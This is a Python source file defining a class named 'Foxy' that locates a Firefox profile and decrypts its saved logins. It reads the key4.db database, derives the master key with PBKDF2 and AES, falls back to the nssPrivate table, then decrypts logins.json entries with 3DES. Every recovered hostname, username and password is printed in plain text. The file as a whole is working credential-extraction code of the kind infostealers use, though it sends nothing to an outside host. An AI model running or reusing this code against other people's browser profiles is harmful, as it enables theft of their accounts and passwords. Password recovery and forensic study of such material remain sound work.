import os
import json
import sqlite3
from base64 import b64decode
from hashlib import sha1, pbkdf2_hmac
from binascii import hexlify, unhexlify
from typing import List, Tuple, Optional

from Crypto.Cipher import DES3, AES
from Crypto.Util.number import long_to_bytes
from Crypto.Util.Padding import unpad
from pyasn1.codec.der import decoder

TRIPLE_DES_OID = "1.2.840.113549.1.12.5.1.3"
PBES2_OID = "1.2.840.113549.1.5.13"


class Foxy:
    """
    A class for extracting and decrypting saved Firefox passwords

    Params:
        profile_dir_path: string pointing to the path of the firefox profile directory
        master_password: bytes for the master password (if set)
    """
    def __init__(self, profile_dir_path: str, master_password: bytes = b""):
        self.profile_dir_path = profile_dir_path
        self.master_password = master_password

    def _decrypt_key(self, encrypted_key_information, global_salt: bytes) -> Optional[bytes]:
        # first need to establish whether it uses 3DES or PBES2
        # PBES2 is (i think) PBKDF2 derivation + AES encryption.
        # check the OID to do this
        encryption_algorithm = str(encrypted_key_information[0][0][0])

        if encryption_algorithm == TRIPLE_DES_OID:
            raise NotImplementedError("3DES Not yet implemented... standby")
        elif encryption_algorithm == PBES2_OID:
            encryption_options_base = encrypted_key_information[0][0][1][0][1]
            salt = encryption_options_base[0].asOctets()
            rounds = int(encryption_options_base[1])
            key_length = int(encryption_options_base[2])
            # hashing key, concatenate the master password (if there is one, often isn't)
            hashed_salt_password = sha1(global_salt + self.master_password).digest()
            # now use PBKDF2 using the hashing password to derive the encryption key itself
            aes_key = pbkdf2_hmac(
                "sha256", hashed_salt_password, salt, rounds, dklen=key_length
            )
            # extract the IV for AES, this is in the ASN.1 object
            iv = b"\x04\x0e" + encrypted_key_information[0][0][1][1][1].asOctets()
            # extract the actual ciphertext to decrypt
            encrypted_key = encrypted_key_information[0][1].asOctets()
            # perform AES CBC decryption using all of this goodness above
            decrypted_key = AES.new(aes_key, AES.MODE_CBC, iv).decrypt(encrypted_key)
            return decrypted_key

    def _extract_encryption_key(self) -> bytes:
        """
        Extract the encryption key from Firefox's key database (key4.db).
        Uses PBKDF2 for key derivation

        Returns:
            bytes: The decrypted encryption key (24 bytes).
        """
        sqlite_database_file_path = os.path.join(self.profile_dir_path, "key4.db")
        connection = sqlite3.connect(sqlite_database_file_path)
        cursor = connection.cursor()
        # item1 is the global salt used, item2 is the ASN.1 encoded, encrypted encryption key
        # item2 is used to decrypt creds stored in logins.json.
        cursor.execute("SELECT item1, item2 from metadata WHERE id = 'password';")
        row = cursor.fetchone()
        global_salt = row[0]
        encoded_encrypted_key_information = row[1]
        encrypted_key_information = decoder.decode(encoded_encrypted_key_information)
        # the key is still encrypted, first decrypt it using salt.
        encryption_key = self._decrypt_key(encrypted_key_information, global_salt)
        # sometimes the key decrypts to "password-check":
        # in key4.db, when no master password is set, the stored encryption key
        # is wrapped with a default placeholder called 'password-check'. This means one of
        # two things:
        # - the correct master password was not provided
        # - the key was not actually decrypted, but instead returned a predefined value
        # if we get to this point, we can get the 'real' decryption key from nssPrivate table.
        # phew, that was a lot. Anyway, let's check for "password-check"
        if encryption_key == b"password-check\x02\x02":
            cursor.execute("SELECT a11, a102 FROM nssPrivate;")
            # a11 is the ASN.1 encoded encrypted key that unlocks stored passwords
            # a102 stored an identifier (CKA_ID) which helps determine which key to use
            row = next((r for r in cursor if r[0] is not None), None)
            key, cka_id = row[0], row[1]
            if cka_id == unhexlify(b"f8000000000000000000000000000001"):
                decoded_key_information = decoder.decode(key)
                encryption_key = self._decrypt_key(decoded_key_information, global_salt)

        return encryption_key[:24]

    def _decode_login_data(self, encoded_login_data: str) -> Tuple[bytes, bytes, bytes]:
        """
        Decode ASN1 encoded encrypted login data

        Arguments:
            encoded_login_data: a b64 encoded, encrypted string to be decoded

        Returns:
            Tuple - key_id, iv, ciphertext - for decryption
        """
        asn1_object = decoder.decode(b64decode(encoded_login_data))
        key_id = asn1_object[0][0].asOctets()
        iv = asn1_object[0][1][1].asOctets()
        ciphertext = asn1_object[0][2].asOctets()
        return key_id, iv, ciphertext

    def _decrypt_login_data(self, encrypted_credentials: List[List[str]], decryption_key: bytes) -> List[List[str]]:
        """
        Decrypt usernames and passwords from login.json using AES256CBC

        Arguments:
            encrypted_credentials: List containing lists in format [hostname, encUsername, encPassword]
            decryption_key: 24-byte 3DES key used for decryption

        Returns:
            List containing plaintext values: [hostname, username, password]
        """
        # encUsername and encPassword are ASN.1 encoded and encrypted, need to do some
        # decoding and parsing first.
        decrypted_credentials = []

        for entry in encrypted_credentials:
            hostname = entry[0]
            encrypted_username = entry[1]
            encrypted_password = entry[2]

            decrypted_data = []

            for encrypted_value in [encrypted_username, encrypted_password]:
                try:
                    _, iv, ciphertext = self._decode_login_data(encrypted_value)

                    cipher = DES3.new(decryption_key, DES3.MODE_CBC, iv)
                    decrypted_padded = cipher.decrypt(ciphertext)

                    decrypted_value = unpad(decrypted_padded, 8).decode()
                    decrypted_data.append(decrypted_value)
                except Exception as e:
                    print(f"[-] Failed to decrypt credentials for {hostname}: {str(e)}")

            username, password = decrypted_data
            decrypted_credentials.append([hostname, username, password])

        return decrypted_credentials

    def _parse_logins_json(self) -> List[List[str]]:
        """
        Parse the logins.json file and retreive hostnames, encrypted usernames, and encrypted passwords

        Returns:
            A list of lists, each inner list contains hostname, encrypted_username, encrypted_password
            respectively.
        """
        logins = []

        with open(
            os.path.join(self.profile_dir_path, "logins.json")
        ) as logins_json_file:
            json_data = json.load(logins_json_file)
            for login_entry in json_data["logins"]:
                hostname = login_entry.get("hostname")
                encrypted_username = login_entry.get("encryptedUsername")
                encrypted_password = login_entry.get("encryptedPassword")
                logins.append([hostname, encrypted_username, encrypted_password])

        return logins

    def retrieve_passwords(self) -> List[List[str]]:
        logins = self._parse_logins_json()
        key = self._extract_encryption_key()
        clear_logins = self._decrypt_login_data(logins, key)
        return clear_logins


if __name__ == "__main__":
    foxy = Foxy("8k3bf3zp.charles")
    decrypted_passwords = foxy.retrieve_passwords()
    for hostname, username, password in decrypted_passwords:
        print(f"[+] {hostname} | {username} | {password}")
